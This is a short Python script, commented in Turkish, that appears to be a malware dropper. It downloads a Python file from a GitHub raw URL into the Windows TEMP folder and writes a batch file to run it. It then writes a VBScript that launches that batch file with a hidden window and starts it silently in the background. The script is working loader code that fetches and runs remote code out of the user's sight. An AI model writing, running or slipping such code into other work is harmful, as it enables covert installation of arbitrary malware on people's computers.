import os
import urllib.request
import subprocess

# Temp klasörü
temp_dir = os.environ.get("TEMP")

# Dosya yolları
loa_py_path = os.path.join(temp_dir, "loa.py")
loa_bat_path = os.path.join(temp_dir, "loa.bat")
loa_vbs_path = os.path.join(temp_dir, "loa.vbs")

# --- 1. loa.py dosyasını URL'den indir ---
loa_py_url = "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/create2.py"
urllib.request.urlretrieve(loa_py_url, loa_py_path)

# --- 2. loa.bat dosyası ---
loa_bat_content = f'''python "{loa_py_path}"
'''

with open(loa_bat_path, "w") as f:
    f.write(loa_bat_content)

# --- 3. loa.vbs dosyası ---
loa_vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\\loa.bat" & Chr(34), 0
Set WshShell = Nothing
'''

with open(loa_vbs_path, "w") as f:
    f.write(loa_vbs_content)

# --- 4. loa.vbs dosyasını başlat (arka planda) ---
subprocess.Popen(["wscript", loa_vbs_path], shell=True)
